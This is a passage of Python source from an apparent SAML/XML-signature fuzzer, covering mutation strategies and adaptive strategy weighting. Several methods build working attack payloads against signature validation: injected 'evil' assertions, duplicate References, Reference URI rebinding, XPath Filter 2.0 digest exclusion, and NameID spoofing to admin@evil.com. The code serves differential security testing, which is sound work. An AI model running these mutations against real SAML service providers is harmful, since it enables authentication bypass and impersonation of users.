        tag_bytes = sm_close.group(0)
        if tag_bytes.endswith(b"/>"):
            new_tag = tag_bytes[:-2] + b">" + truncation + b"</ds:SignatureMethod>"
            result = bytearray(
                bytes(result[:sm_close.start()])
                + new_tag
                + bytes(result[sm_close.end():])
            )
        else:
            # Insert truncation before the close tag
            insert_pos = sm_close.start()
            result = bytearray(
                bytes(result[:insert_pos])
                + truncation
                + bytes(result[insert_pos:])
            )
        return result

    def _manifest_reference_inject(self, data: bytearray) -> bytearray | None:
        """Inject Manifest inside ds:Object with Reference to evil Assertion.

        xmldsig-core §2.3/§5.1: Manifest References have same structure as
        SignedInfo References, but validation is 'under application control'.
        Some libraries validate them, others ignore. Injecting a Manifest
        with a Reference to an evil Assertion tests this divergence.
        """
        sig_span = _find_element_span(data, _RE_SIGNATURE_OPEN, _RE_SIGNATURE_CLOSE)
        if not sig_span:
            return None
        # Build evil assertion with known ID
        evil_id = self.rng.randbytes(4).hex().encode()
        evil_assertion = _make_evil_assertion(self.rng)
        # Build Manifest referencing the evil assertion
        manifest_obj = MANIFEST_TEMPLATE.replace(b"{REF_URI}", b"_evil_" + evil_id)
        # Insert evil assertion before Signature, Manifest after Signature
        sig_start, sig_end = sig_span
        result = bytearray(
            bytes(data[:sig_start])
            + evil_assertion
            + bytes(data[sig_start:sig_end])
            + manifest_obj
            + bytes(data[sig_end:])
        )
        return result

    def _reference_dual_target(self, data: bytearray) -> bytearray | None:
        """Add second Reference pointing to evil Assertion.

        xmldsig-core §4.3.3: 'Reference may occur one or more times in
        SignedInfo.' CVE-2025-29774 showed xml-crypto validates only first.
        We add a second Reference with different URI to test selection.
        """
        m_ref = _RE_REFERENCE_BLOCK.search(data)
        if not m_ref:
            return None
        # Create evil assertion
        evil_assertion = _make_evil_assertion(self.rng)
        evil_id = re.search(rb'ID="([^"]*)"', evil_assertion)
        if not evil_id:
            return None
        # Build second Reference pointing to evil assertion
        second_ref = (
            b'<ds:Reference URI="#' + evil_id.group(1) + b'">'
            b'<ds:Transforms>'
            b'<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>'
            b'<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>'
            b'</ds:Transforms>'
            b'<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>'
            b'<ds:DigestValue>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=</ds:DigestValue>'
            b'</ds:Reference>'
        )
        # Insert second Reference after original, evil assertion before Signature
        result = bytearray(
            bytes(data[:m_ref.end()])
            + second_ref
            + bytes(data[m_ref.end():])
        )
        # Prepend evil assertion at start of Assertion
        m_assert = _RE_ASSERTION_OPEN.search(result)
        if m_assert:
            result = bytearray(
                bytes(result[:m_assert.start()])
                + evil_assertion
                + bytes(result[m_assert.start():])
            )
        return result

    def _keyinfo_keyname(self, data: bytearray) -> bytearray | None:
        """Replace X509Data with KeyName element.

        xmldsig-core §4.4.1: KeyName is Optional. Some libraries use it for
        key lookup, others ignore. Replacing X509 cert with a KeyName tests
        whether the library trusts embedded key identifiers.
        """
        m = _RE_KEYINFO.search(data)
        if not m:
            return None
        replacement = self.rng.choice(KEYINFO_KEYNAME_PAYLOADS)
        return bytearray(
            bytes(data[:m.start()]) + replacement + bytes(data[m.end():])
        )

    def _keyinfo_retrieval_method(self, data: bytearray) -> bytearray | None:
        """Replace X509Data with RetrievalMethod URI.

        xmldsig-core §4.4.3: RetrievalMethod uses same URI dereferencing as
        Reference. Spec warns it 'introduces security risk' via Transform
        child elements. Some libraries follow the URI, others ignore.
        """
        m = _RE_KEYINFO.search(data)
        if not m:
            return None
        replacement = self.rng.choice(KEYINFO_RETRIEVAL_PAYLOADS)
        return bytearray(
            bytes(data[:m.start()]) + replacement + bytes(data[m.end():])
        )

    def _reference_type_manifest(self, data: bytearray) -> bytearray | None:
        """Add Type='#Manifest' attribute to Reference element.

        xmldsig-core §4.3.3: Optional Type attribute hints content type.
        Some libraries treat Type=Manifest specially, others ignore it.
        """
        m = _RE_REFERENCE_URI.search(data)
        if not m:
            return None
        # Insert Type attribute after URI attribute
        type_attr = b' Type="http://www.w3.org/2000/09/xmldsig#Manifest"'
        insert_pos = m.end(3)  # after the closing quote of URI
        return bytearray(
            bytes(data[:insert_pos]) + type_attr + bytes(data[insert_pos:])
        )

    def _reference_scope_rebind(self, data: bytearray) -> bytearray | None:
        """Rebind the Reference URI to an unsigned decoy while leaving
        the Assertion intact, targeting reference_matches_selected_assertion.

        E2 Stage B pilot (2026-04-12, saml_stageb_pilot) ranked
        ``reference_matches_selected_assertion`` / ``reference_scope_divergence``
        as the #3 pivotal feature (I≈0.147, CI [0.137, 0.155]). Existing
        strategies cover empty URI, XPointer, dual Reference, and duplicate
        clones, but none directly exercise the semantic gap where one library
        trusts ``Reference/@URI`` as the scope oracle while another scans for
        Assertion elements independently.

        Four sub-modes:

        * ``decoy_in_extensions`` — inject a harmless ``<saml:Advice>``
          with a fresh ID inside (or creating) ``samlp:Extensions`` and
          retarget the Reference URI at it.
        * ``decoy_before_sig`` — inject the same decoy as a direct
          sibling of the Signature element.
        * ``response_id`` — retarget the Reference URI at the enclosing
          ``samlp:Response`` element (adding an ``ID`` attribute if it
          lacks one). Libraries that scope to the Response root accept;
          libraries that require the Assertion subtree reject.
        * ``fake_id`` — retarget at a non-existent ID. Libraries fall
          back differently (whole-document c14n vs error vs ignore).

        The Assertion (and its attacker-controlled NameID/AttributeValue
        content) is never touched, so subject-extraction libraries still
        read the attacker identity while scope-check libraries lose the
        anchor. This registers on the ``reference_scope_divergence``
        oracle.
        """
        m_uri = _RE_REFERENCE_URI.search(data)
        if not m_uri:
            return None

        mode = self.rng.choice([
            "decoy_in_extensions",
            "decoy_before_sig",
            "response_id",
            "fake_id",
        ])

        decoy_id_s = "_decoy_" + self.rng.randbytes(4).hex()
        decoy_id = decoy_id_s.encode()
        new_uri = b"#" + decoy_id

        # Rewrite Reference URI first (common to decoy_* and fake_id modes).
        patched = bytearray(
            bytes(data[:m_uri.start(2)]) + new_uri + bytes(data[m_uri.end(2):])
        )

        if mode == "fake_id":
            return patched

        decoy_elem = (
            b'<saml:Advice xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"'
            b' ID="' + decoy_id + b'">harmless</saml:Advice>'
        )

        if mode == "decoy_in_extensions":
            ext_m = _RE_EXTENSIONS.search(patched)
            if ext_m:
                pos = ext_m.end(1)  # after <samlp:Extensions> open tag
                return bytearray(
                    bytes(patched[:pos]) + decoy_elem + bytes(patched[pos:])
                )
            resp_m = _RE_RESPONSE_OPEN.search(patched)
            if not resp_m:
                return None
            ext_block = (
                b'<samlp:Extensions'
                b' xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">'
                + decoy_elem
                + b"</samlp:Extensions>"
            )
            return bytearray(
                bytes(patched[:resp_m.end()])
                + ext_block
                + bytes(patched[resp_m.end():])
            )

        if mode == "decoy_before_sig":
            sig_m = _RE_SIGNATURE_OPEN.search(patched)
            if not sig_m:
                return None
            return bytearray(
                bytes(patched[:sig_m.start()])
                + decoy_elem
                + bytes(patched[sig_m.start():])
            )

        # mode == "response_id"
        resp_m = _RE_RESPONSE_OPEN.search(patched)
        if not resp_m:
            return None
        resp_tag = bytes(resp_m.group(0))
        id_m = re.search(rb'\bID="([^"]*)"', resp_tag)
        if id_m:
            response_id = id_m.group(1)
        else:
            response_id = b"_resp_" + self.rng.randbytes(3).hex().encode()
            # Inject ID= right before the closing '>' of <samlp:Response ...>.
            close_at = resp_m.end() - 1
            patched = bytearray(
                bytes(patched[:close_at])
                + b' ID="' + response_id + b'"'
                + bytes(patched[close_at:])
            )
        m_uri2 = _RE_REFERENCE_URI.search(patched)
        if not m_uri2:
            return None
        target_uri = b"#" + response_id
        return bytearray(
            bytes(patched[:m_uri2.start(2)])
            + target_uri
            + bytes(patched[m_uri2.end(2):])
        )

    # ══════════════════════════════════════════════════════════════
    # P: C14N spec-derived strategies (90-94)
    #    Based on xml-exc-c14n §2-4, xml-c14n2
    # ══════════════════════════════════════════════════════════════

    def _c14n_prefixlist_inject(self, data: bytearray) -> bytearray | None:
        """Inject InclusiveNamespaces PrefixList into exc-c14n Transform.

        exc-c14n §4: Listed prefixes are handled with inclusive c14n rules.
        Injecting 'saml ds #default' forces these namespaces to inherit
        ancestor context, changing the digest. Different from _inclusive_ns_manipulate
        which modifies EXISTING PrefixList — this injects a NEW one into
        Transform elements that lack it.
        """
        if b"xml-exc-c14n#" not in data:
            return None
        # Find exc-c14n transform that has NO InclusiveNamespaces child
        exc_re = re.compile(
            rb'(<ds:Transform\s+Algorithm="http://www\.w3\.org/2001/10/xml-exc-c14n#")\s*(/?>)',
            re.IGNORECASE | re.DOTALL,
        )
        m = exc_re.search(data)
        if not m:
            return None
        # Check if there's already an InclusiveNamespaces nearby
        after = bytes(data[m.end():m.end() + 200])
        if b"InclusiveNamespaces" in after and b"</ds:Transform>" in after:
            return None  # already has one, defer to _inclusive_ns_manipulate
        prefix_list = self.rng.choice([
            b"saml ds",
            b"saml ds samlp #default",
            b"#default",
            b"ds xsi",
            b"saml",
        ])
        inc_ns = (
            b'<ec:InclusiveNamespaces '
            b'xmlns:ec="http://www.w3.org/2001/10/xml-exc-c14n#" '
            b'PrefixList="' + prefix_list + b'"/>'
        )
        if m.group(2) == b"/>":
            # Self-closing → open + child + close
            new_tag = m.group(1) + b">" + inc_ns + b"</ds:Transform>"
            return bytearray(
                bytes(data[:m.start()]) + new_tag + bytes(data[m.end():])
            )
        else:
            # Open tag → insert child after >
            return bytearray(
                bytes(data[:m.end()]) + inc_ns + bytes(data[m.end():])
            )

    def _c14n_qname_in_attrvalue(self, data: bytearray) -> bytearray | None:
        """Add xsi:type QName in attribute value to test c14n namespace handling.

        exc-c14n §1.1/§5: 'Implementations do not consider the appearance of a
        namespace prefix within an attribute value to be visibly utilized.'
        Adding xsi:type='xsd:string' where xsd: is declared on ancestor creates
        a namespace that exclusive c14n omits but inclusive c14n includes.
        """
        m_assert = _RE_ASSERTION_OPEN.search(data)
        if not m_assert:
            return None
        # Add xsd namespace to Assertion and xsi:type to a child
        ns_inject = (
            b' xmlns:xsd="http://www.w3.org/2001/XMLSchema"'
            b' xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"'
        )
        insert_pos = m_assert.end() - 1  # before >
        result = bytearray(
            bytes(data[:insert_pos]) + ns_inject + bytes(data[insert_pos:])
        )
        # Find NameID and add xsi:type attribute
        m_nameid = re.search(rb'(<saml:NameID\b)([^>]*>)', result,
                             re.IGNORECASE | re.DOTALL)
        if m_nameid:
            type_attr = b' xsi:type="xsd:string"'
            pos = m_nameid.end(1)
            result = bytearray(
                bytes(result[:pos]) + type_attr + bytes(result[pos:])
            )
        return result

    def _c14n_xml_attr_ancestor(self, data: bytearray) -> bytearray | None:
        """Inject xml:lang or xml:space on ancestor element.

        exc-c14n §3 point 1: Exclusive c14n OMITS xml: namespace attribute
        search from ancestors. Inclusive c14n includes them. Adding xml:lang
        to Response causes inclusive c14n to include it in Assertion digest
        but exclusive c14n omits it, creating divergence.
        """
        m_resp = _RE_RESPONSE_OPEN.search(data)
        if not m_resp:
            return None
        xml_attr = self.rng.choice([
            b' xml:lang="en"',
            b' xml:space="preserve"',
            b' xml:lang="de"',
            b' xml:base="https://idp.example.com/"',
        ])
        insert_pos = m_resp.end() - 1  # before >
        return bytearray(
            bytes(data[:insert_pos]) + xml_attr + bytes(data[insert_pos:])
        )

    def _c14n_default_ns_switch(self, data: bytearray) -> bytearray | None:
        """Switch saml: prefix namespace to default namespace.

        exc-c14n §3 condition 4: Default namespace rendering rules differ
        from prefixed namespace rules. Switching xmlns:saml='...' to
        xmlns='...' changes c14n output completely.
        """
        if b'xmlns:saml="' not in data:
            return None
        saml_ns = b"urn:oasis:names:tc:SAML:2.0:assertion"
        # Replace xmlns:saml="..." with xmlns="..."
        result = bytearray(data)
        result = bytearray(bytes(result).replace(
            b'xmlns:saml="' + saml_ns + b'"',
            b'xmlns="' + saml_ns + b'"',
            1,  # only first occurrence
        ))
        # Replace saml: prefix on elements
        for prefix_tag in [b"saml:Assertion", b"saml:Issuer", b"saml:Subject",
                           b"saml:NameID", b"saml:Conditions", b"saml:Audience",
                           b"saml:AudienceRestriction", b"saml:AuthnStatement",
                           b"saml:AuthnContext", b"saml:AuthnContextClassRef",
                           b"saml:SubjectConfirmation", b"saml:SubjectConfirmationData",
                           b"saml:AttributeStatement", b"saml:Attribute",
                           b"saml:AttributeValue"]:
            local = prefix_tag.split(b":")[1]
            result = bytearray(bytes(result).replace(
                b"<" + prefix_tag, b"<" + local
            ))
            result = bytearray(bytes(result).replace(
                b"</" + prefix_tag, b"</" + local
            ))
        return result

    def _c14n_2_0_algorithm_swap(self, data: bytearray) -> bytearray | None:
        """Swap c14n algorithm to C14N 2.0 URI.

        C14N 2.0 (W3C Note, not Rec): URI http://www.w3.org/2010/xml-c14n2.
        Most libraries don't support it. Tests fallback behavior — some
        may silently fall back to c14n 1.0, others reject.
        """
        c14n2_uri = b"http://www.w3.org/2010/xml-c14n2"
        # Try CanonicalizationMethod first
        m = _RE_C14N_METHOD.search(data)
        if m:
            result = bytearray(
                bytes(data[:m.start(2)]) + c14n2_uri + bytes(data[m.end(2):])
            )
            # Optionally add C14N 2.0 parameters
            if self.rng.random() < 0.5:
                param = self.rng.choice(C14N2_PARAMS)
                # Insert param after CanonicalizationMethod close
                cm_close = re.search(rb'(/?>)', result[m.start():], re.IGNORECASE)
                if cm_close and cm_close.group(1) == b"/>":
                    pos = m.start() + cm_close.start()
                    new_tag = (
                        bytes(result[:pos]) + b">"
                        + param
                        + b"</ds:CanonicalizationMethod>"
                        + bytes(result[pos + 2:])
                    )
                    result = bytearray(new_tag)
            return result
        return None

    # ══════════════════════════════════════════════════════════════
    # Q: SAML Core/Profiles spec-derived strategies (95-97)
    # ══════════════════════════════════════════════════════════════

    def _subject_confirmation_sender_vouches(self, data: bytearray) -> bytearray | None:
        """Change SubjectConfirmation to sender-vouches method.

        SAML Core §2.4.1.1: sender-vouches means the attesting entity
        vouches for the subject. Most SP libraries have NO validation path
        for this method, potentially accepting any assertion.
        """
        m = _RE_SUBJECT_CONFIRMATION.search(data)
        if not m:
            # No SubjectConfirmation — inject one
            m_subject = re.search(rb'(</saml:Subject>)', data, re.IGNORECASE)
            if not m_subject:
                return None
            inject = (
                b'<saml:SubjectConfirmation'
                b' Method="urn:oasis:names:tc:SAML:2.0:cm:sender-vouches"/>'
            )
            return bytearray(
                bytes(data[:m_subject.start()])
                + inject
                + bytes(data[m_subject.start():])
            )
        return bytearray(
            bytes(data[:m.start(2)])
            + b"urn:oasis:names:tc:SAML:2.0:cm:sender-vouches"
            + bytes(data[m.end(2):])
        )

    def _authz_decision_inject(self, data: bytearray) -> bytearray | None:
        """Inject AuthzDecisionStatement with Decision='Permit'.

        SAML Core §2.7.2.2: AuthzDecisionStatement carries authorization
        decisions. Most SAML SPs only expect AuthnStatement. Injecting
        AuthzDecisionStatement tests parser confusion and whether any
        library interprets Decision='Permit' as authorization.
        """
        # Insert before </saml:Assertion>
        m_close = _RE_ASSERTION_CLOSE.search(data)
        if not m_close:
            return None
        return bytearray(
            bytes(data[:m_close.start()])
            + AUTHZ_DECISION_STATEMENT
            + bytes(data[m_close.start():])
        )

    def _sso_expired_signed(self, data: bytearray) -> bytearray | None:
        """Set NotOnOrAfter to past timestamp while keeping valid structure.

        SAML Profiles §4.1.4: SSO processing checks Conditions timing.
        Libraries that check conditions BEFORE signature reject early;
        others verify signature first. Tests validation order divergence.
        """
        m = _RE_NOTONORAFTER.search(data)
        if not m:
            return None
        # Set to a past date
        past_dates = [
            b"2020-01-01T00:00:00Z",
            b"2000-01-01T00:00:00Z",
            b"1970-01-01T00:00:00Z",
        ]
        return bytearray(
            bytes(data[:m.start(2)])
            + self.rng.choice(past_dates)
            + bytes(data[m.end(2):])
        )

    # ══════════════════════════════════════════════════════════════
    # R: XPath Filter 2.0 spec-derived strategies (98-100)
    #    Based on W3C xmldsig-filter2
    # ══════════════════════════════════════════════════════════════

    def _xpath_filter2_subtract_conditions(self, data: bytearray) -> bytearray | None:
        """Inject XPath Filter 2.0 subtract to exclude Conditions from digest.

        xmldsig-filter2: subtract operation excludes selected subtrees from
        digest calculation. Excluding Conditions allows expired/wrong-audience
        assertions to pass digest verification. Also modifies Conditions to
        exploit the exclusion.
        """
        m_transforms = _RE_TRANSFORMS.search(data)
        if not m_transforms:
            return None
        filter_payload = self.rng.choice(XPATH_FILTER2_SUBTRACT_PAYLOADS)
        # Insert Filter 2.0 transform before existing transforms
        insert_pos = m_transforms.start(2)
        result = bytearray(
            bytes(data[:insert_pos]) + filter_payload + bytes(data[insert_pos:])
        )
        # If we excluded Conditions, set NotOnOrAfter to past
        if b"Conditions" in filter_payload:
            m_noa = _RE_NOTONORAFTER.search(result)
            if m_noa:
                result = bytearray(
                    bytes(result[:m_noa.start(2)])
                    + b"2020-01-01T00:00:00Z"
                    + bytes(result[m_noa.end(2):])
                )
        # If we excluded Subject, change NameID
        if b"Subject" in filter_payload:
            m_nid = _RE_NAMEID.search(result)
            if m_nid:
                result = bytearray(
                    bytes(result[:m_nid.start(2)])
                    + b"admin@evil.com"
                    + bytes(result[m_nid.end(2):])
                )
        return result

    def _xpath_filter2_union_evil(self, data: bytearray) -> bytearray | None:
        """Inject XPath Filter 2.0 union to include additional content in digest.

        xmldsig-filter2: union adds nodes to the digest scope. Adding //*
        includes the entire document (potentially including evil content
        outside the Reference URI scope) in the digest calculation.
        """
        m_transforms = _RE_TRANSFORMS.search(data)
        if not m_transforms:
            return None
        filter_payload = self.rng.choice(XPATH_FILTER2_UNION_PAYLOADS)
        insert_pos = m_transforms.start(2)
        return bytearray(
            bytes(data[:insert_pos]) + filter_payload + bytes(data[insert_pos:])
        )

    def _xpath_filter2_multi_step(self, data: bytearray) -> bytearray | None:
        """Inject multi-step XPath Filter 2.0: subtract then union.

        xmldsig-filter2 Processing Model: XPath elements are evaluated
        sequentially. First subtract Conditions, then union everything
        back. Some libraries process in order, others may merge or skip.
        """
        m_transforms = _RE_TRANSFORMS.search(data)
        if not m_transforms:
            return None
        # Step 1: subtract Conditions
        # Step 2: union everything (should re-include Conditions)
        multi_filter = (
            b'<ds:Transform Algorithm="http://www.w3.org/2002/06/xmldsig-filter2">'
            b'<XPath xmlns="http://www.w3.org/2002/06/xmldsig-filter2" Filter="subtract"'
            b' xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
            b'//saml:Conditions'
            b'</XPath>'
            b'<XPath xmlns="http://www.w3.org/2002/06/xmldsig-filter2" Filter="union">'
            b'//*'
            b'</XPath>'
            b'</ds:Transform>'
        )
        insert_pos = m_transforms.start(2)
        return bytearray(
            bytes(data[:insert_pos]) + multi_filter + bytes(data[insert_pos:])
        )

    # ── Feedback API (matches cookie_mutator interface) ───────

    def feedback(self, strategy_name: str, signal: str) -> None:
        """Receive feedback from engine about strategy effectiveness.

        Args:
            strategy_name: Name of the strategy that produced the result.
            signal: "finding", "stage_up", or "coverage".
        """
        try:
            idx = self._strategy_names.index(strategy_name)
        except ValueError:
            return

        self._total_feedback_calls += 1

        if signal == "finding":
            self._strategy_finds[idx] += 1
            self._weights[idx] = min(
                self._weights[idx] + max(self._base_weights[idx] // 4, 1),
                self._base_weights[idx] * 3,
            )
        elif signal == "stage_up":
            self._strategy_cov[idx] += 1
            self._weights[idx] = min(
                self._weights[idx] + max(self._base_weights[idx] * 15 // 100, 1),
                self._base_weights[idx] * 3,
            )
        elif signal == "coverage":
            self._strategy_cov[idx] += 1
            self._weights[idx] = min(
                self._weights[idx] + max(self._base_weights[idx] // 10, 1),
                self._base_weights[idx] * 3,
            )

        if self._total_feedback_calls % 1000 == 0:
            for i in range(len(self._strategies)):
                if self._strategy_finds[i] == 0 and self._strategy_cov[i] == 0:
                    self._weights[i] = max(self._weights[i] - 1, 1)

    # Guidance field → strategy name patterns (for apply_guidance_weights)
    _FIELD_TO_STRATEGIES: dict[str, list[str]] = {
        # Attacker-controlled fields
        "SignatureValue": [
            "sig_strip", "comment_inject_sigvalue", "sigvalue_multi_comment",
            "hmac_confusion", "golden_saml",
        ],
        "Reference.URI": [
            "reference_uri", "duplicate_reference", "xpointer",
            "reference_scope_rebind",
        ],
        "Assertion": [
            "xsw1", "xsw2", "xsw3", "xsw4", "xsw5", "xsw7", "xsw8",
            "xsw_envelope", "xsw_first_assertion", "xsw_signed_in_extensions",
            "assertion_count_bomb",
        ],
        "NameID": [
            "nameid_spoof", "nameid_mixed_content", "multi_nameid",
        ],
        "NameID.text": [
            "nameid_spoof", "nameid_mixed_content", "multi_nameid",
        ],
        "NameID.children": [
            "nameid_mixed_content", "nameid_spoof",
        ],
        "CanonicalizationMethod.Algorithm": [
            "c14n_method_swap", "c14n_superfluous_ns", "c14n_inherited_ns",
            "c14n_attr_value", "void_c14n", "inclusive_ns",
        ],
        "DigestMethod.Algorithm": [
            "algo_downgrade", "digestvalue_leading_comment",
            "digestvalue_cdata", "digestvalue_split", "digestvalue_pi",
        ],
        "Conditions.NotBefore": [
            "condition_manipulation", "timestamp_manipulation",
        ],
        "Conditions.NotOnOrAfter": [
            "condition_manipulation", "timestamp_manipulation",
        ],
        "AudienceRestriction": [
            "audience_bypass", "condition_manipulation",
        ],
        "Issuer": [
            "issuer_spoof",
        ],
        "Issuer.text": [
            "issuer_spoof",
        ],
        "InResponseTo": [
            "subject_confirmation_bypass",
        ],
        "Assertion.ID": [
            "assertion_id_collision", "reference_uri",
        ],
    }

    def apply_guidance_weights(self, field_weights: dict[str, float]) -> None:
        """Apply guidance-driven weight boosts with zero-sum rebalancing.

        Targeted strategies get 3-5x boost; non-targeted get attenuated
        so targeted strategies hold ~40% of total selection probability.
        """
        targeted: set[int] = set()
        for field, multiplier in field_weights.items():
            patterns = self._FIELD_TO_STRATEGIES.get(field, [])
            if not patterns:
                continue
            for i, sname in enumerate(self._strategy_names):
                if any(pat in sname for pat in patterns):
                    boost = 1.0 + 4.0 * multiplier  # focus=1.0→5x, secondary=0.3→2.2x
                    self._weights[i] = min(
                        int(self._base_weights[i] * boost),
                        self._base_weights[i] * 6,
                    )
                    targeted.add(i)

        if not targeted:
            return

        # Attenuate non-targeted to make boost meaningful
        targeted_sum = sum(self._weights[i] for i in targeted)
        non_targeted = [i for i in range(len(self._weights)) if i not in targeted]
        non_targeted_sum = sum(self._weights[i] for i in non_targeted)
        if non_targeted_sum > 0:
            desired_ratio = 1.5  # targeted:non_targeted ≈ 40:60
            scale = min(targeted_sum * desired_ratio / non_targeted_sum, 1.0)
            for i in non_targeted:
                self._weights[i] = max(int(self._weights[i] * scale), 1)

        total = sum(self._weights)
        t_pct = sum(self._weights[i] for i in targeted) / total * 100 if total else 0
        _log.info(
            "Guidance weights: %d/%d strategies targeted (%.0f%% of weight)",
            len(targeted), len(self._strategy_names), t_pct,
        )

    def reset_weights(self, boost_zero_finds: bool = False) -> None:
        """Reset dynamic weights — called by engine on stall detection."""
        if boost_zero_finds:
            for i in range(len(self._strategies)):
                if self._strategy_finds[i] == 0:
                    self._weights[i] = min(
                        self._base_weights[i] + max(self._base_weights[i] // 3, 1),
                        self._base_weights[i] * 2,
                    )
                else:
                    self._weights[i] = self._base_weights[i]
        else:
            self._weights = list(self._base_weights)
